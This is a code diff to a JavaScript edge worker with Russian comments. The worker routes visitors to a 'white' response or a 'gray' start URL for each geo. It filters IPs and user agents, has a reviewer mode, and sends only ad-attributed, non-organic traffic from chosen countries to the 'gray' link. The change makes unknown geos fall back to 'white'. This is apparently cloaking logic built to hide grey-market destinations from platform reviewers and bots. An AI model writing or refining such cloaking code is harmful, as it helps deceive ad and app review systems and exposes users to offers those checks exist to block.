@@ -66,8 +66,7 @@ function getConfig(env) {
     testReviewerMode: env.TEST_REVIEWER_MODE === "true",
     testForceGray:    env.TEST_FORCE_GRAY    === "true",
 
-    // Ссылки по ГЕО
-    startUrl:    env.START_URL    || "",
+    // Ссылки по ГЕО — только боевые локали, дефолта нет
     startUrlGb:  env.START_URL_GB || "",
     startUrlDe:  env.START_URL_DE || "",
     startUrlEs:  env.START_URL_ES || "",
@@ -81,10 +80,18 @@ function getConfig(env) {
   };
 }
 
+// Возвращает URL для ГЕО или null если ГЕО не из боевых локалей
+// null → white (не наша аудитория)
 function resolveStartUrl(cfg, geo) {
-  const map = { gb: cfg.startUrlGb, de: cfg.startUrlDe,
-                es: cfg.startUrlEs, it: cfg.startUrlIt, ca: cfg.startUrlCa };
-  return map[geo] || cfg.startUrl || "";
+  const map = {
+    gb: cfg.startUrlGb,
+    de: cfg.startUrlDe,
+    es: cfg.startUrlEs,
+    it: cfg.startUrlIt,
+    ca: cfg.startUrlCa,
+  };
+  const url = map[geo];
+  return (url && url.length > 0) ? url : null;
 }
 
 function isNonOrganic(body, allowOrganic) {
@@ -179,7 +186,11 @@ export default {
       if (cfg.testReviewerMode) return respond(false);
 
       // Тест: форс gray
-      if (cfg.testForceGray) return respond(true, resolveStartUrl(cfg, geo));
+      if (cfg.testForceGray) {
+        const url = resolveStartUrl(cfg, geo);
+        if (!url) return respond(false);  // даже в тест-режиме — неизвестное ГЕО → white
+        return respond(true, url);
+      }
 
       // IP / UA фильтр
       if (isBlockedIp(ip) || isBlockedUA(ua)) return respond(false);
@@ -190,8 +201,12 @@ export default {
       // Атрибуция
       if (!isNonOrganic(body, cfg.allowOrganic)) return respond(false);
 
-      // Неорганика → gray
-      return respond(true, resolveStartUrl(cfg, geo));
+      // ГЕО не из боевых локалей → white
+      const startUrl = resolveStartUrl(cfg, geo);
+      if (!startUrl) return respond(false);
+
+      // Всё ок → gray
+      return respond(true, startUrl);
     }
 
     return new Response("Not Found", { status: 404 });
